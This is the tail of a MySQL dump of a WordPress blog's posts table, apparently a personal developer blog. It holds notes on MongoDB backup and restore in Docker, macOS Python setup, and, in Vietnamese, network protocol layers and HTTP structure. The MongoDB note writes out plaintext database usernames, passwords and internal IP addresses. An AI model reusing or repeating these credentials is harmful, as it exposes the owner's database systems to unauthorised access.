(2529, 1, '2022-10-12 09:10:27', '2022-10-12 09:10:27', '<pre>\r\n// Create container\r\ndocker pull mongo:4.2.17\r\ndocker run -d --name my-mongo -v ~/mongodb/dump:/dump mongo:4.2.17\r\n\r\n// Check version and test connect\r\ndocker exec -it my-mongo bash\r\nroot@d93c98c18ae3:/# mongo --version\r\nroot@d93c98c18ae3:/# momgodump --version\r\nroot@d93c98c18ae3:/# mongorestore --version\r\nroot@d93c98c18ae3:/# mongo mongodb://schat:schat12345@10.240.13.38:27017/schat?authSource=schat\r\n\r\n// Backup\r\ndocker exec -it my-mongo bash\r\nroot@d93c98c18ae3:/# momgodump --help\r\nroot@d93c98c18ae3:/# mongodump -h 10.240.12.102:27017 -u appqa2schat -p tahcs2aqppa --db=schat --archive=/dump/v4.gz --gzip\r\nroot@d93c98c18ae3:/# ls -la /dump/\r\n\r\n// Restore\r\ndocker exec -it my-mongo bash\r\nroot@d93c98c18ae3:/# mongorestore --help\r\nroot@d93c98c18ae3:/# mongorestore -h 10.240.13.38:27017 -u schat -p schat12345 --db=schat --drop --archive=/dump/v4.gz --gzip --noIndexRestore\r\n</pre>\r\n\r\n\r\n', 'MongoDB - Backup and Restore', '', 'publish', 'open', 'open', '', 'mongodb-backup-and-restore', '', '', '2022-10-12 09:50:35', '2022-10-12 09:50:35', '', 0, 'https://duycode.com/?p=2529', 0, 'post', '', 0),
(2590, 1, '2022-11-02 09:28:36', '2022-11-02 09:28:36', '1. Intall python3\r\n<pre>\r\n// intall python3 by brew\r\n// python3 default\r\nsudo ln -s -f /opt/homebrew/bin/python3 /usr/local/bin/python\r\nsudo ln -s -f /opt/homebrew/bin/pip3 /usr/local/bin/pip\r\npython --version\r\npip --version\r\n</pre>', 'MacOS cơ bản', '', 'publish', 'open', 'open', '', 'macos-co-ban', '', '', '2022-11-02 09:28:36', '2022-11-02 09:28:36', '', 0, 'https://duycode.com/?p=2590', 0, 'post', '', 0),
(2649, 1, '2022-11-16 20:43:24', '2022-11-16 20:43:24', 'Mô hình OSI có 7 tầng\r\n<img src=\"https://images.viblo.asia/1596a7ea-09cc-4a36-82ac-48768e0cb24f.png\" alt=\"https://images.viblo.asia/1596a7ea-09cc-4a36-82ac-48768e0cb24f.png\" />\r\nBộ giao thức TCP/IP có 4 tầng giao thức\r\n1. Tầng vật lý: bao gồm các thiết bị phần cứng giao tiếp với môi trường mạng: Ethernet,...\r\n2. Tầng mạng: đóng gói dữ liệu kèm theo chứa dữ liệu của địa chỉ nguồn và địa chỉ đích: IP\r\n3. Tầng giao thức: có nhiệm vụ trao đổi dữ liệu, xác định trạng thái kết nối khi vận chuyển. Có 2 giao thức chính: TCP (đảm báo gói tin và đúng thứ tự) và UDP (koc cần đảm bảo gói tin mà cần tốc độ như truyền video)\r\n4. Tầng ứng dụng: HTTP, FTP, SSH ... là các giao thức ứng dụng của bộ giao thức TCP/IP. Bộ giao thức này có 2 giao thức chính là giao thức TCP và giao thức IP\r\n\r\nCác thành phần HTTP:\r\n1 HTTP Request\r\n<img src=\"https://images.viblo.asia/87ee0c1c-abac-4d08-973e-e8bae533cbf0.png\" alt=\"\" />\r\n- Request-line: Phương thức + URI + phiên bản HTTP\r\n- Header\r\n- Body\r\n2. HTTP Response\r\n<img src=\"https://images.viblo.asia/8414d386-f4e5-4b9c-aded-d3b379dc7c20.png\" alt=\"\" />\r\n- Status-line: phiên bản HTTP + Mã trạng thái + Trạng thái\r\n- Header\r\n- Body\r\n\r\n\r\n', 'Câu hỏi Web Developer – P3. Các bộ giao thức mạng', '', 'publish', 'open', 'open', '', 'cau-hoi-web-developer-p3-cac-bo-giao-thuc-mang', '', '', '2023-06-19 03:24:13', '2023-06-19 03:24:13', '# Description\r\n```\r\n&lt;h1&gt;Cái gì đây ta&lt;/h1&gt;\r\n&lt;h2&gt;Chịu chết&lt;/h2&gt;\r\n```\r\n# Gõ thế này thích hơn này hahah\r\n[as](https://duycode.com/wp-admin/post.php?post=2649&action=edit \"as\")\r\n\r\n{@gist: https://gist.github.com/JeffreyWay/207e3bfdb5cafff050a1d75dbf755a5c}', 0, 'https://duycode.com/?p=2649', 0, 'post', '', 0),
(3187, 1, '2024-03-04 19:39:29', '2024-03-04 19:39:29', '261372581709581169', '261372581709581169', '261372581709581169', 'trash', 'closed', 'open', '', '261372581709581169__trashed', '', '', '2024-03-04 19:39:33', '2024-03-04 19:39:33', '', 0, 'https://duycode.com/?p=3187', 0, 'post', '', 0),
(3189, 1, '2024-03-05 05:55:15', '2024-03-05 05:55:15', '234712551709618115', '234712551709618115', '234712551709618115', 'trash', 'closed', 'open', '', '234712551709618115__trashed', '', '', '2024-03-05 05:55:20', '2024-03-05 05:55:20', '', 0, 'https://duycode.com/?p=3189', 0, 'post', '', 0);

--
-- Indexes for dumped tables
--

--
-- Indexes for table `duycode_posts`
--
ALTER TABLE `duycode_posts`
  ADD PRIMARY KEY (`ID`),
  ADD KEY `post_name` (`post_name`(191)),
  ADD KEY `type_status_date` (`post_type`,`post_status`,`post_date`,`ID`),
  ADD KEY `post_parent` (`post_parent`),
  ADD KEY `post_author` (`post_author`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `duycode_posts`
--
ALTER TABLE `duycode_posts`
  MODIFY `ID` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3191;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
